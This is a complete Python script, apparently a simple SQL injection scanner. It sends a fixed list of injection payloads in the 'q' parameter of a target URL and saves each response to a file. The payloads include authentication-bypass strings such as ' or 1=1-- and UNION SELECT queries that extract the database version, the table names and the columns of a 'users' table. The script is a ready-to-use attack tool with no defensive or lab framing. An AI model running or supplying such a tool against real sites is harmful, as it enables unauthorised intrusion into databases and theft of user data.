import requests
import argparse

parser = argparse.ArgumentParser(description='Generate payloads for a given URL')
parser.add_argument('url', metavar='URL', type=str, help='URL to generate payloads for')
parser.add_argument('--headers', metavar='HEADERS', type=str, help='Custom headers to include in requests')
parser.add_argument('--params', metavar='PARAMS', type=str, help='Custom query parameters to include in requests')
parser.add_argument('--output', metavar='OUTPUT', type=str, default='payloads.txt', help='File to save generated payloads to')

args = parser.parse_args()

url = args.url
headers = {}
params = {}
output_file = args.output

if args.headers:
    headers = dict(item.split(":") for item in args.headers.split(";"))
if args.params:
    params = dict(item.split(":") for item in args.params.split(";"))

# Payloads to generate
payloads = [
    "' or 1=1--",
    "' or '1'='1",
    "' or 1=1#",
    "' or '1'='1#",
    "' union select 1,2,3--",
    "' union select 1,@@version,3--",
    "' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--",
    "' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--"
]

# Generate and send requests for each payload
results = []
for payload in payloads:
    query_params = params.copy()
    query_params['q'] = payload
    response = requests.get(url, headers=headers, params=query_params)
    result = {'payload': payload, 'status': response.status_code, 'content': response.text}
    results.append(result)

# Write results to output file
with open(output_file, 'w') as f:
    for result in results:
        f.write(f"Payload: {result['payload']}\n")
        f.write(f"Status: {result['status']}\n")
        f.write(f"Content: {result['content']}\n\n")
